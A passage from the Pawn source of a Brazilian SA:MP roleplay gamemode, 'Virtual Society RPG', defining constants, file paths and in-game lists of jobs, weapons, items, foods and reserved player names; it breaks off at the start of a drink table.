/*-----------------------------------------------------------
	Virtual Society RPG
	Copyright(C) 2010/2012 The Virtual Society Team

	Author:
	Rafael "Saturnus" Ravedutti <rafael_msn_7@hotmail.com>
    
    Project Leaders:
    Saturnus
    Texugo
    Michael
    
	Virtual Society Team:
	Guilherme
	Osorkon
	Brutows
	Manny
	
	Special Thanks:
	Rockstar Games
	SA:MP Team
	Brazucas'Server
-----------------------------------------------------------*/

#include <a_samp>
#include <a_http>
#include <md5>

#define SERVER_DIRECTORY        		"Virtual Society RPG/"
#define ACCOUNTS_FILE_PATH              "Virtual Society RPG/Accounts.ini"
#define ACCOUNTS_BUFFER_FILE_PATH       "Virtual Society RPG/Accounts.buf"
#define BAN_FILE_PATH                   "Virtual Society RPG/BannedUsers.ini"
#define BAN_BUFFER_FILE_PATH            "Virtual Society RPG/BannedUsers.buf"
#define ACTION_REPORT_FILE_PATH         "Virtual Society RPG/Log/Actions.ini"
#define PAY_REPORT_FILE_PATH         	"Virtual Society RPG/Log/Pays.ini"
#define CHAT_REPORT_FILE_PATH         	"Virtual Society RPG/Log/Chat.ini"
#define JOBS_REPORT_FILE_PATH         	"Virtual Society RPG/Log/Jobs.ini"
#define POLICE_REPORT_FILE_PATH         "Virtual Society RPG/Log/Police.ini"
#define CONNECTION_REPORT_FILE_PATH     "Virtual Society RPG/Log/Connections.ini"
#define UCP_REPORT_FILE_PATH            "Virtual Society RPG/Log/UCP.ini"
#define GLOBAL_FILE_PATH                "Virtual Society RPG/World/Global.ini"
#define SERVER_VEHICLES_FILE_PATH       "Virtual Society RPG/World/ServerVehicles.ini"
#define PLAYER_VEHICLES_FILE_PATH       "Virtual Society RPG/World/PlayerVehicles.ini"
#define GANGZONES_FILE_PATH             "Virtual Society RPG/World/GangZones.ini"
#define GANGS_FILE_PATH                 "Virtual Society RPG/World/Gangs.ini"
#define COMPANIES_FILE_PATH             "Virtual Society RPG/World/Companies.ini"
#define PHONES_FILE_PATH             	"Virtual Society RPG/World/Phones.ini"
#define BETS_FILE_PATH                  "Virtual Society RPG/World/Bets.ini"
#define WINNERS_FILE_PATH               "Virtual Society RPG/World/Winners.ini"
	
#define USE_UCP                         false
#define TEXTDRAW_USE_ACCENT             true
#define SHOW_CONNECTIONS                true
#define SHOW_GAMEMODE_LOGO              true
#define SHOW_WEEKDAY                    true
#define SHOW_GANGZONE_TEXT              true

#define NULL                   			0
#define HSYS_SEP_CHAR                   '='
#define TEXT(%1)    					(TextDrawString(%1))
#define STRINGIZE_CHAR(%1)  			(StringizeChar(%1))
#define RGBA(%1,%2,%3,%4)               ((%1 & 0xFF) << 24 | (%2 & 0xFF) << 16 | (%3 & 0xFF) << 8 | (%4 & 0xFF))
#define reportf(%1,%2,%3)                                                                                   \
										do                                                                  \
										{                                                            		\
											new msg[256];                                           		\
											format(msg, sizeof msg, (%1), %3);                  			\
											report(msg, %2);                                                \
										}                                              						\
										while(VFALSE)

#define SetPlayerColour                 SetPlayerColor
#define GetPlayerColour                 GetPlayerColor
#define ChangeVehicleColour             ChangeVehicleColor
#define TextDrawColour                  TextDrawColor
#define TextDrawBoxColour               TextDrawBoxColor
#define TextDrawBackgroundColour        TextDrawBackgroundColor

//UCP
#define UCP_ACCESS_DENIED               -1
#define UCP_NULL_REQUEST                -2
#define UCP_CANT_CONNECT                -3
#define UCP_QUERY_ERROR                 -4
#define UCP_FTPGET_ERROR                -5

#define UCP_BAN                         'b'
#define UCP_KICK                        'k'
#define UCP_MESSAGE                     'm'

#define HTTP_CHECK                      2

//Cores padrões
#define COLOUR_YELLOW            		0xFFFF00AA
#define COLOUR_LIGHT_YELLOW      		0xFFFFE0AA
#define COLOUR_DARK_GOLD                0xEEAD0EAA
#define COLOUR_GOLD              		0xFFD700AA
#define COLOUR_WHITE             		0xFFFFFFAA
#define COLOUR_BLACK                    0x000000AA
#define COLOUR_GRAY              		0xB5B5B5AA
#define COLOUR_RED               		0xFF0000AA
#define COLOUR_ORANGE            		0xFF4500AA
#define COLOUR_LIGHT_ORANGE             0xFFD177AA
#define COLOUR_BLUE              		0x0000FFAA
#define COLOUR_ROYAL_BLUE        		0x4169E1AA
#define COLOUR_SKY_BLUE          		0x87CEFAAA
#define COLOUR_LIGHT_BLUE    			0xADD8E6AA
#define COLOUR_PINK  					0xFFC0CBAA
#define COLOUR_PURPLE        			0xA020F0AA
#define COLOUR_AZURE         			0xE0EEEEAA
#define COLOUR_GREEN             		0x00FF00AA
#define COLOUR_LIGHT_GREEN       		0x98FB98AA
#define COLOUR_LIGHT_OLIVE              0xB5C964AA

//Cores dos empregos
#define COLOUR_UNEMPLOYED      			0x696969AA
#define COLOUR_FISHER   	  			0xFFA07AAA
#define COLOUR_CABBIE           		0xFFFFE0AA
#define COLOUR_BARMAN            		0xF0E68CAA
#define COLOUR_PIZZABOY          		0xF5DEB3AA
#define COLOUR_MACHINIST      			0x9AC0CDAA
#define COLOUR_GARBAGE                  0x8B795EAA
#define COLOUR_FARMER                   0xFFE4C4AA
#define COLOUR_TRUCKER             		0xE4E4E4AA
#define COLOUR_JOURNALIST               0xFFFFFFAA
#define COLOUR_PILOT                    0xFFA500AA
#define COLOUR_SMUGGLER                 0xFF6347AA
#define COLOUR_MECHANIC                 0xCAE1FFAA
#define COLOUR_PARAMEDIC        		0xFFC0CBAA
#define COLOUR_SECURITY                 0x83BFBFAA
#define COLOUR_DRIVER                   0xFFE4C4AA
#define COLOUR_ARM_DEALER               0x00BFFFAA
#define COLOUR_POLICE  					0xADD8E6AA
#define COLOUR_LAWYER                   0x9ACD32AA
#define COLOUR_DRUG_DEALER        		0xCD6600AA
#define COLOUR_SWAT     				0x87CEFAAA
#define COLOUR_DELEGATE          		0x4169E1AA
#define COLOUR_JUDGE             		0x7FFF00AA

//Cores das submissões
#define COLOUR_ICE_CREAM                0xFF91ECAA
#define COLOUR_DRUGS                    0xCD6600AA
#define COLOUR_DJ                       0x4169E1AA
#define COLOUR_CEMENT                   0xE6E6FAAA
#define COLOUR_IML                      0x00CED1AA
#define COLOUR_POST                     0xE0EEEEAA

//Tipos de report
#define REPORT_DEFAULT                  0
#define REPORT_CHAT                     1
#define REPORT_ACTION                   2
#define REPORT_PAY                      3
#define REPORT_CONNECTION               4
#define REPORT_UCP                      5

//Cores de administradores
#define COLOUR_ADMIN                    COLOUR_ROYAL_BLUE
#define COLOUR_MODERATOR                COLOUR_GOLD
#define COLOUR_REPORT_DEFAULT           COLOUR_ADMIN
#define COLOUR_REPORT_ACTION            COLOUR_ORANGE
#define COLOUR_REPORT_PAY               COLOUR_GREEN

//Tipos de cores
#define COLOUR_TYPE_DEFINED     		0
#define COLOUR_TYPE_JOB         		1
#define COLOUR_TYPE_GANG        		2

//Empregos
#define JOB_UNEMPLOYED              	1
#define JOB_FISHER                      2
#define JOB_CABBIE                      3
#define JOB_BARMAN                      4
#define JOB_PIZZABOY                    5
#define JOB_MACHINIST               	6
#define JOB_GARBAGE                     7
#define JOB_FARMER                      8
#define JOB_TRUCKER                     9
#define JOB_JOURNALIST                  10
#define JOB_PILOT                       11
#define JOB_SMUGGLER                    12
#define JOB_MECHANIC                    13
#define JOB_PARAMEDIC                   14
#define JOB_SECURITY                    15
#define JOB_DRIVER                      16
#define JOB_ARM_DEALER                  17
#define JOB_POLICE			            18
#define JOB_LAWYER                      19
#define JOB_DRUG_DEALER            		20
#define JOB_SWAT 		         		21
#define JOB_DELEGATE               		22
#define JOB_JUDGE                       23

//Submissões
#define SUBMISSION_ICE_CREAM            0
#define SUBMISSION_DRUGS                1
#define SUBMISSION_DJ                   2
#define SUBMISSION_FUNKDJ               3
#define SUBMISSION_CEMENT               4
#define SUBMISSION_IML                  5
#define SUBMISSION_POST                 6
#define SUBMISSION_MAX                  7

//Level mínimo
#define MIN_LEVEL_CREATE_GANG           35
#define MIN_LEVEL_BUY_HOUSE             10
#define MIN_LEVEL_BUY_COMPANY           10
#define MIN_LEVEL_BUY_VEHICLE           5

//Key IDs
#define K_WEAPON                      	KEY_SPRINT
#define K_ENTER                       	KEY_WALK
#define K_LOCK                        	KEY_SUBMISSION
#define K_MODSHOP                     	KEY_CROUCH
#define K_ROPE                        	KEY_HANDBRAKE
#define K_VEHICLE                		KEY_SECONDARY_ATTACK
#define K_SPEAK                       	KEY_CTRL_BACK
#define K_DRINK                         KEY_FIRE
#define K_SMOKE                         KEY_FIRE
#define K_ROB                           KEY_SECONDARY_ATTACK
#define K_POWER                         KEY_FIRE
#define K_ATTACK1                       KEY_JUMP
#define K_ATTACK2                       KEY_SECONDARY_ATTACK
#define K_ATTACK3                       KEY_ANALOG_LEFT
#define K_ATTACK4                       KEY_ANALOG_RIGHT

//Key Events
#define KEY_EVENT_NULL                  0
#define KEY_EVENT_CAMERA                1
#define KEY_EVENT_WINDOW                2
#define KEY_EVENT_CLOTHES               4
#define KEY_EVENT_DANCING               8
#define KEY_EVENT_STRIPPING             16
#define KEY_EVENT_PAINTING              32
#define KEY_EVENT_FLYING                64
#define KEY_EVENT_NEWS                	128
#define KEY_EVENT_DJ                    256

//Player Events
#define PLAYER_EVENT_NULL               0
#define PLAYER_EVENT_ROPE               1
#define PLAYER_EVENT_HOLDING            2
#define PLAYER_EVENT_NEWS        		4
#define PLAYER_EVENT_CHECKAREA          5

//Areas
#define AREA_NULL                       0
#define AREA_GAS_STATION           		1
#define AREA_HOSPITAL             		2
#define AREA_CUSTOM_SHOP            	3
#define AREA_MOD_SHOP                   4
#define AREA_POLICE_DEPARTMENT          5
#define AREA_CAR_DEALER        			6
#define AREA_TRIBUNAL                   7
#define AREA_TRAILER                    8
#define AREA_CHOP                       9
#define AREA_HABT                       10
#define AREA_HABN                       11
#define AREA_HABA                       12
#define AREA_FISH                       13
#define AREA_FARM                       14
#define AREA_ICE_CREAM                  15
#define AREA_IML                        16
#define AREA_CEMENT                     17
#define AREA_POST                       18

//Attached Objects
#define OBJECT_SLOT_HANDGUN     		0
#define OBJECT_SLOT_HAT                 1
#define OBJECT_SLOT_GLASSES          	2
#define OBJECT_SLOT_GUITAR           	3
#define OBJECT_SLOT_CARRY               4
#define OBJECT_SLOT_CELLPHONE           5

//Contadores
#define COUNTER_CONNECTED               0
#define COUNTER_WANTED      			1
#define COUNTER_JOB     				2
#define COUNTER_PAY     				3
#define COUNTER_HOTEL   				4
#define COUNTER_ARSENAL                 5
#define COUNTER_LEVEL                   6
#define COUNTER_DRUG                    7

//Interiores
#define INT_BANK                        0
#define INT_24/7_SHOP                   1
#define INT_LOTTERY                     2
#define INT_HORSE_LOTTERY               3
#define INT_DISCO                       4
#define INT_STRIP_CLUB                  5
#define INT_RESTAURANT                  6
#define INT_BAR                         7
#define INT_BINCO                		8
#define INT_SUB_URBAN                   9
#define INT_PRO_LAPS                    10
#define INT_VICTIM                      11
#define INT_DIDIER_SACHS                12
#define INT_GUN_SHOP                    13
#define INT_DONUTS_SHOP                 14
#define INT_PIZZERIA                 	15
#define INT_CLUCKIN_BELL                16
#define INT_BURGER_SHOT                 17
#define INT_POLICE_DEPARTMENT           18
#define INT_QUESTIONING                 19
#define INT_TRIBUNAL                    20
#define INT_INSURER                     21
#define INT_REAL_ESTATE                 22
#define INT_TOY_SHOP                    23
#define INT_WORLD_COQ                   24
#define INT_SEX_SHOP                    25
#define INT_FARM                        26
#define INT_HOTEL                       27
#define INT_FUNK                        28
#define INT_ACCESS1                  	29
#define INT_ACCESS2                     30
#define INT_ACCESS3                     31
#define INT_ACCESS4                     32
#define INT_ACCESS5                     33

//Empresas
#define COMPANY_NONE        			0
#define COMPANY_FISH                	1
#define COMPANY_TAXI           			2
#define COMPANY_BAR         			3
#define COMPANY_PIZZA       			4
#define COMPANY_TRASH       			5
#define COMPANY_HOSPITAL       			6
#define COMPANY_POLICE      			7
#define COMPANY_SMUGGLING               8
#define COMPANY_FARM                    9
#define COMPANY_NEWS        			10
#define COMPANY_AIRPORT                 11
#define COMPANY_LIMO                    12
#define COMPANY_SECURITY                13
#define COMPANY_CUSTOM    				14
#define COMPANY_WEAPON                  15
#define COMPANY_TRANSPORT   			16
#define COMPANY_TRUCK       			17
#define COMPANY_CRACK       			18
#define COMPANY_LAWYER      			19
#define COMPANY_TRIBUNAL                20

//Checkpoints
#define CHECKPOINT_NONE                 0
#define CHECKPOINT_AMMUNATION          	1
#define CHECKPOINT_DONUTS               2
#define CHECKPOINT_PIZZA                3
#define CHECKPOINT_CHICKEN              4
#define CHECKPOINT_BURGER               5
#define CHECKPOINT_DRINKS               6
#define CHECKPOINT_RESTAURANT           7
#define CHECKPOINT_24/7_SHOP            8
#define CHECKPOINT_TOY_SHOP             9
#define CHECKPOINT_WORLD_COQ            10
#define CHECKPOINT_SEX_SHOP             11
#define CHECKPOINT_HOTEL                12
#define CHECKPOINT_LOTTERY              13
#define CHECKPOINT_BINCO             	14
#define CHECKPOINT_SUB_URBAN            15
#define CHECKPOINT_PRO_LAPS             16
#define CHECKPOINT_VICTIM 	            17
#define CHECKPOINT_DIDIER_SACHS         18
#define CHECKPOINT_CANS                 19
#define CHECKPOINT_TRASH                20
#define CHECKPOINT_ACCESSORY            21

//Cargos de gangue
#define GANG_POST_NONE					0
#define GANG_POST_SOLDIER				1
#define GANG_POST_PILOT					2
#define GANG_POST_SCOUT					3
#define GANG_POST_ROCKET				4
#define GANG_POST_TRAFFICKER			5
#define GANG_POST_TOWER					6
#define GANG_POST_SWORD_ARM				7
#define GANG_POST_LEADER				8

//Cargos de empresas
#define COMPANY_POST_NONE               0
#define COMPANY_POST_EMPLOYEE           1
#define COMPANY_POST_PARTNER            2

//Tipos de veículos
#define MODEL_TYPE_CAR      			1
#define MODEL_TYPE_BIKE     			2
#define MODEL_TYPE_AIR      			3
#define MODEL_TYPE_BOAT     			4

//Lojas de roupas
#define CLOTHES_NONE                    0
#define CLOTHES_BINCO                   1
#define CLOTHES_SUB_URBAN               2
#define CLOTHES_PRO_LAPS                3
#define CLOTHES_VICTIM                  4
#define CLOTHES_DIDIER_SACHS            5

//Tipos de acessórios
#define ACCESSORY_TYPE_NULL     		0
#define ACCESSORY_TYPE_HAT      		1
#define ACCESSORY_TYPE_GLASSES          2
#define ACCESSORY_TYPE_GUITAR           3

//Acessórios
#define ACCESSORY_NULL                  0
#define ACCESSORY_CLUCKIN_BELL          1
#define ACCESSORY_RED_GLASSES           2
#define ACCESSORY_ORANGE_GLASSES        3
#define ACCESSORY_GREEN_GLASSES         4
#define ACCESSORY_BLUE_GLASSES          5
#define ACCESSORY_PURPLE_GLASSES        6
#define ACCESSORY_BASS_GUITAR           7
#define ACCESSORY_GUITAR_FLYING_V       8
#define ACCESSORY_GUITAR_WARLOCK        9

//Itens
#define ITEM_WALKTALKIE                 1

//Dialogs
#define DIALOG_REGISTER_LOGIN           1
#define DIALOG_INVITE                   2
#define DIALOG_LOTTERY                  3
#define DIALOG_LICENSE_GUN              4
#define DIALOG_ACCESSORIES              5

//Map Icons
#define MAX_MAP_ICONS                   50
#define MAP_ICON_RADIUS                 300.0

//Virtual Worlds específicos
#define HISTORY_VIRTUAL_WORLD           501
#define DEATH_VIRTUAL_WORLD             502

//Slots
#define MAX_SLOTS               		50

//Casas
#define MAX_HOUSES                      400
#define HOUSE_RADIUS                    4.0

//Skill level
#define MAX_SKILL_LEVEL                 900

//Celular
#define NO_CELL_PHONE                   0

//Armas
#define MAX_DROPPED_WEAPONS             100
#define DROPPED_WEAPON_TIME             200000
#define DROPPED_WEAPON_DISTANCE         2.0

//Tuning
#define SPOILERS                    	0
#define HOODS                        	1
#define ROOFSCOOPS                   	2
#define SIDESKIRTS                  	3
#define LAMPS                       	4
#define NITROS                      	5
#define EXHAUSTS                    	6
#define WHEELS                      	7
#define STEREO                      	8
#define HYDRAULICS                  	9
#define FRONTBUMPERS                	10
#define REARBUMPERS                 	11
#define BULLBARS                    	12
#define REARBULLBARS                	13
#define FRONTBULLBARS               	14
#define VENTS                     		15
#define FRONTSIGN                   	16
#define PAINTJOBS                   	17

//Propostas
#define INVITE_NONE                     0
#define INVITE_GANG                     1
#define INVITE_REPAIR                   2
#define INVITE_COMPANY                  3
#define INVITE_JOB                      4
#define INVITE_CHOP                     5

//Login
#define IsPlayerLogged(%1)             	(Login[%1] != 0)

//Tempo
#define CurrentHour     				(CurrentTime / 60)
#define CurrentMinute   				(CurrentTime % 60)

//Updates
#define UPDATE_MONEY                    1
#define UPDATE_WEAPONS                  2
#define UPDATE_HEALTH                   4

//TextDraws
#define TEXTDRAW_STYLE_1                1
#define TEXTDRAW_STYLE_2                2
#define TEXTDRAW_STYLE_3                3
#define TEXTDRAW_STYLE_4                4
#define TEXTDRAW_STYLE_5                5
#define TEXTDRAW_STYLE_6				6
#define TEXTDRAW_STYLE_7                7

//Preco da gasolina (por litro)
#define FUEL_COST                       2

//Flags de veiculos
#define VFROZEN_NO_GAS      			1
#define VFROZEN_NO_KEY      			2
#define VFROZEN_PAINT                   4
#define VFROZEN_REPAIR                  8
#define VFROZEN_FUEL                    16

//Roupas
#define CLOTHES_TEXT_STRING_BUY     	("~g~<    ~h~~r~[ Comprar ]    ~g~> ~n~      ~w~[ Cancelar ]")
#define CLOTHES_TEXT_STRING_CANCEL     	("~g~<    ~w~[ Comprar ]    ~g~> ~n~      ~h~~r~[ Cancelar ]")

//Rapel
#define ROPES                           5
#define ROPE_HEIGHT                     6.0

//Rotas
#define ROUTES                          4

//Nametags
#define NAME_TAG_DRAW_DISTANCE          7.0

//Contadores
#define INCREASER_COUNTER    			1
#define DECREASER_COUNTER    			2
#define UNLIMITED           			-1

#define SetPlayerCounter(%1,%2,%3)      hSetInt(GetPlayerKFilePath(%1), Counters[%2][cntKey], %3)
#define GetPlayerCounter(%1,%2)         hGetInt(GetPlayerKFilePath(%1), Counters[%2][cntKey])

//Veiculos de trabalho
#define IsJobVehicle(%1,%2)             FuncIsJobVehicle(%1, %2, sizeof %2)
#define GetJobVehicle(%1,%2)            FuncGetJobVehicle(%1, %2, sizeof %2)
#define IsPlayerInJobVehicle(%1,%2)     FuncIsPlayerInJobVehicle(%1, %2, sizeof %2)
#define GetPlayerJobVehicle(%1,%2)      FuncGetPlayerJobVehicle(%1, %2, sizeof %2)

#define SetJobVehiclesParamsForPlayer(%1,%2,%3)                                                                 \
										do    																	\
										{                               										\
						    				if(%3)                												\
										        SetVehiclesParamsForPlayer(%1, sizeof %1, %2, 0, 0);    		\
											else                                                            	\
											    SetVehiclesParamsForPlayer(%1, sizeof %1, %2, 0, 1);     		\
										}                                                                   	\
										while(VFALSE)

//Objetos
#define GetNextMatrixObject(%1,%2,%3)   FuncGetNextMatrixObject(%1, %2, %3, sizeof %2)

//Timers
#define DeleteTimer(%1)                                                                                         \
										do                                                                      \
										{                                                                       \
										    if(%1)                                                              \
										    	KillTimer(%1), %1 = 0;                                          \
										}                                                                       \
										while(VFALSE)

//Level
#define AddLevel(%1)    				Pay(%1, 0)

//Funções matemáticas
#define fmax(%1,%2)                     (%1 > %2 ? %1 : %2)
#define mod(%1)     					(%1 > 0 ? %1 : -%1)

//Variáveis constantes estáticas
static const 		NCOMMANDS  	=	8;
static const        NLINES      =   30;
static const        MYEAR       =   2011;
static const        TMUSIC      =   5000;
static const Float: ERADIUS     =   30.0;
static const bool:	VFALSE		= 	false;

//Timers
enum timerInfo
{
	tName[64],
	tInterval,
	tId
}
	
new GlobalTimer[][timerInfo] = {
	{"Update",			50},
	{"KeyHandler",      150},
	{"Speedometer",		500},
	{"Time",			1000},
	{"GeneralHandler",	2000},

#if USE_UCP == true

	{"HTTPCheck",       3000},
	
#endif

	{"GateHandler",		3000},
	{"Hour",			60000},
	{"ServerWarning",	600000}
};

//Admin
enum adminInfo
{
    admFly,
    admReportOff,
    admSpec,
    admPower,
    admInt,
    Float:admX,
    Float:admY,
    Float:admZ,
    Float:admA
}

new AdminData[MAX_SLOTS][adminInfo];

//Cameras
enum camInfo
{
	camTrackPos,
	Float:camPosTimes,
	Float:camLookAtTimes,
	Float:camSpeedX,
	Float:camSpeedY,
	Float:camSpeedZ,
	Float:camLookAtX,
	Float:camLookAtY,
	Float:camLookAtZ
}

enum rccamInfo
{
	Float:rccamPosX,
	Float:rccamPosY,
	Float:rccamPosZ,
	Float:rccamLookAtX,
	Float:rccamLookAtY,
	Float:rccamLookAtZ
}

new RequestClassCameras[][rccamInfo] = {
	{2042.6848, -1404.6050, 68.8817,  2000.6848, -1398.6050, 69.8817},
	{1866.8502, -1775.1092, 29.2311,  1854.8231, -1759.1296, 32.2311},
	{1661.5819, -1702.5007, 30.6002,  1643.1673, -1710.3048, 33.6004},
	{1258.1088, -2014.5166, 61.1217,  1265.2869, -1995.8491, 69.1217},
	{312.1636,  -2210.8625, 56.4740,  312.5242,  -2190.8657, 59.4739},
	{723.2746,  -1495.9520, 4.7723,   723.9611,  -1515.9401, 1.7724},
	{978.6209,  -1197.3568, 60.3330,  998.3764,  -1194.2395, 63.3328},
	{1805.8369, -1301.4531, 121.4892, 1787.0469, -1294.6019, 124.4890},
	{1678.8044, -1241.5515, 129.8754, 1690.5507, -1257.7386, 132.8747},
	{1418.5927, -988.1676,  62.1543,  1420.3472, -968.2446,  59.1542},
	{2170.1069, -1051.8825, 64.6203,  2151.0822, -1058.0520, 70.6205}
};

//Explosivos
enum explosiveInfo
{
	expName[64],
	expValue,
	expLimit
}

new Explosives[][explosiveInfo] = {
    {"Bomba-Relogio",    			500,   		1},
	{"Bomba c/ sensor aprox.",     	700,   		1},
	{"Bomba Remota",     			700,   		1},
	{"Bomba de gas",                100,        2},
	{"Flash",           			200,    	2},
	{"Rojao",           			100,    	2}
};

//Contadores
enum counterInfo
{
	cntKey[64],
	cntType,
	cntLimit
}

new Counters[][counterInfo] = {
	{"Counter",			INCREASER_COUNTER,		UNLIMITED},
	{"WantedCounter",   DECREASER_COUNTER,		0},
	{"JobCounter",      DECREASER_COUNTER,		0},
	{"PayCounter",      INCREASER_COUNTER,		180},
	{"HotelCounter",    INCREASER_COUNTER,  	24},
	{"ArsenalCounter",  DECREASER_COUNTER,      0},
	{"LevelCounter",    DECREASER_COUNTER,      0},
	{"DrugCounter",     DECREASER_COUNTER,      0}
};

//Banco
new Float:CashDesks[][4] = {
	{2316.6157,    -12.5012,   26.7421,    267.0591},
	{2316.5209,    -9.8417,    26.7421,    267.6858},
	{2316.6196,    -4.6564,    26.7421,    270.1925},
	{2316.6164,    -1.9108,    26.7421,    272.3858},
	{2308.8811,    -2.1851,    26.7421,    90.3608},
	{2309.1923,    -8.6288,    26.7421,    91.3008}
};

//Anti Bot
new BotNames[][] = {
	"Carl",
	"Rocky",
	"Pepe",
	"Arnoldo",
	"SgtPepper",
	"Pepsi",
	"Pepno",
	"Azucar",
	"Vino_Toro",
	"Zoquete",
	"Pacman",
	"Batman",
	"AquilesBrinco",
	"Manfrey",
	"Papirola",
	"Sopapeala",
	"com1",
	"com2",
	"tcom1",
	"tcom2",
	"tcom3",
	"tcom4",
	"tcom5",
	"tcom6",
	"tcom7",
	"tcom8",
	"tcom9",
	"lpt1",
	"lpt2",
	"lpt3",
	"lpt4",
	"lpt5",
	"lpt6",
	"lpt7",
	"lpt8",
	"lpt9",
	"clock$",
	"nul",
	"aux",
	"prn",
	"con",
	"[ViP]Labrik",
	"Sonny",
	"[MT]Lavis",
	"Admin",
	"Administrador",
	"Server",
	"Servidor",
	"NONE",
	"NULL"
};

//Itens
enum itInfo
{
	itName[64],
	itValue
}

new ItemList[][itInfo] = {
	{"Walk-Talkie",         500},
	{"Celular",				600},
	{"Recarga 2mins",		10},
	{"Recarga 5mins",		25},
	{"Recarga 10mins",		50},
	{"Recarga 20mins",		100},
	{"Faca",                200},
	{"Bastao de Baseball",  250},
	{"Taco de Golfe",  		250},
	{"Flores",              100},
	{"Bengala",             150},
	{"Soco ingles",         150}
};

//Armas
enum weaponInfo
{
	wName[64],
	wValue,
	wAmmo,
	wAmmoLimit,
	wObjectId,
	wSkill,
	wSlot
}
            
new Weapons[][weaponInfo] = {
	{"Mão livre",							0,			0,			-1,			0,				-1,								0},
	{"Soco Inglês",							50,			0,			-1,			331,			-1,								0},
	{"Taco de Golfe",						300,		0,			-1,			333,			-1,								1},
	{"Cacetete",							100,		0,			-1,			334,			-1,								1},
	{"Faca",								300,		0,			-1,			335,			-1,								1},
	{"Taco de Baseball",					200,		0,			-1,			336,			-1,								1},
	{"Shovel",								150,		0,			-1,			337,			-1,								1},
	{"Taco de Sinuca",						100,		0,			-1,			338,			-1,								1},
	{"Katana",								300,		0,			-1,			339,			-1,								1},
	{"Motosserra",							500,		0,			-1,			341,			-1,								1},
	{"Vibrador roxo duas pontas",			50,			0,			-1,			321,			-1,								10},
	{"Vibrador branco grande",				50,			0,			-1,			322,			-1,								10},
	{"Vibrador branco medio",				50,			0,			-1,			323,			-1,								10},
	{"Vibrador prata pequeno",				50,			0,			-1,			324,			-1,								10},
	{"Flores",								50,			0,			-1,			325,			-1,								10},
	{"Bengala",								50,			0,			-1,			326,			-1,								10},
	{"Granada",								600,		1,			3,			342,			-1,								8},
	{"Bomba de gás",						200,		1,			3,			343,			-1,								8},
	{"Molotov",								500,		1,			3,			344,			-1,								8},
	{"Lança Foguetes",						0,			0,			-1,			0,				-1,								8},
	{"Lança-Foguetes Tele-Guiado",			0,			0,			-1,			0,				-1,								-1},
	{"Hydra Rocket",						0,			0,			-1,			0,				-1,								-1},
	{"Pistola 9mm",							200,		30,			90,			346,			WEAPONSKILL_PISTOL,				2},
	{"Pistola 9mm c/ silenciador",			250,		30,			90,			347,			WEAPONSKILL_PISTOL_SILENCED,	2},
	{"Desert Eagle",						400,		12,			60,			348,			WEAPONSKILL_DESERT_EAGLE,		2},
	{"Escopeta Calibre 12",					600,		10,			30,			349,			WEAPONSKILL_SHOTGUN,			3},
	{"Escopeta de Cano Serrado",			700,		16,			64,			350,			WEAPONSKILL_SAWNOFF_SHOTGUN,	3},
	{"Escopeta de Combate",					600,		15,			60,			351,			WEAPONSKILL_SPAS12_SHOTGUN,		3},
	{"Micro Uzi",							400,		50,			350,		352,			WEAPONSKILL_MICRO_UZI,			4},
	{"MP5",									400,		60,			360,		353,			WEAPONSKILL_MP5,				4},
	{"AK47",								600,		30,			300,		355,			WEAPONSKILL_AK47,				5},
	{"M4",									600,		30,			300,		356,			WEAPONSKILL_M4,					5},
	{"TEC-9",								400,		50,			350,		372,			WEAPONSKILL_MICRO_UZI,			4},
	{"Country Rifle",						700,		10,			30,			357,			WEAPONSKILL_SNIPERRIFLE,		6},
	{"Sniper Rifle",                        800,		10,			30,			358,			-1,								6},
	{"RPG",                     			1000,		1,			3,			359,			-1,								7},
	{"Canhao",        						1200,		1,			3,			360,			-1,								7},
	{"Lança Chamas",                        1000,		20,			120,		361,			-1,								7},
	{"Minigun",                             5000,		30,			150,		362,			-1,								7},
	{"Sachtel Charges",                     500,		1,			3,			363,			-1,								8},
	{"Detonador",                           0,			0,			-1,			0,				-1,								12},
	{"Spray",                               200,		50,			150,		365,			-1,								9},
	{"Extintor de incendio",                200,		50,			150,		366,			-1,								9},
	{"Camera",                              50,			5,			20,			367,			-1,								9},
	{"Nightvision",                         300,		0,			-1,			0,				-1,								11},
	{"Heatvision",                          300,		0,			-1,			0,				-1,								11},
	{"Paraquedas",                          50,			0,			-1,			371,			-1,								11}
};

new WeaponSlots[][] = {
	"Soco ingles",
	"Armas brancas",
	"Pistolas",
	"Escopetas",
	"Uzi",
	"Rifles",
	"Snipers",
	"RPG",
	"Granadas",
	"Diversas",
	"Itens",
	"Equipamentos",
	"Detonador"
};

enum droppedweaponInfo
{
	dwWeaponId,
	dwAmmo,
	dwObjectId,
	dwTimer,
	dwExist
}

new DroppedWeapons[MAX_DROPPED_WEAPONS][droppedweaponInfo];
new DroppedWeapon[MAX_SLOTS] = 0;

//Speaks
new Speaks[][] = {
	"_",
	"Affirmative!",
	"Negative!",
	"Go go go!",
	"Need help!",
	"Team, fall back!",
	"Cover me!",
	"Follow me!",
	"Enemy down!",
	"Regroup team!",
	"Taking fire, need assistance!",
	"You take the point.",
	"Enemy spotted!",
	"Mission completed, sir!"
};

new SpeakId[MAX_SLOTS] = 0;
new SpeakTimer[MAX_SLOTS] = 0;
new Radio[MAX_SLOTS] = 0;

//Mochila
new BackpackObject[MAX_SLOTS];

//Alimentos
enum foodInfo
{
	foodName[64],
	foodValue,
	Float:foodHealth
}

enum drinkInfo
{
	drinkName[64],
	drinkValue,
	drinkAction
}

new DonutsFlavor[][64] = {
	"Creme",
	"Chocolate",
	"Morango",
	"Baunilha"
};

new PizzasFlavor[][foodInfo] = {
	{"Calabresa",               40,		5.0},
	{"Frango c/ catupiry",      60,		9.0},
	{"Atum",                    30,		2.5},
	{"Milho",                   20,		2.0},
	{"Strogonoff",              50,		8.0},
	{"Palmito",                 40,		5.0}
};

new ChickensFlavor[][foodInfo] = {
    {"Frango ao molho",        	50,		8.0},
    {"Frango a milanesa",       70,		11.0},
	{"Sanduiche de frango",     40,		5.0},
	{"Espetinho de frango",     30,		2.5},
	{"Salada",               	60,		9.0}
};

new BurgersFlavor[][foodInfo] = {
	{"X-Burger",               	30,		2.5},
	{"X-Salada",               	40,		5.0},
	{"X-Calabresa",             50,		8.0},
	{"X-Frango",               	40,		5.0},
	{"X-Bacon",               	50,		8.0},
	{"X-Egg",               	60,		9.0},
	{"Cachorro quente",         70,		10.0}
};

new Food[][foodInfo] = {
    {"File",               		60,		9.0},
    {"Alcatra",               	70,		11.0},
	{"Lasanha",               	60,		9.0},
	{"Peixe",               	80,		12.5},
	{"Lagosta",               	100,	15.0},
	{"Strogonoff",              50,		8.0},
	{"Salada",               	60,		9.0}
};

new Drink[][drinkInfo] = {
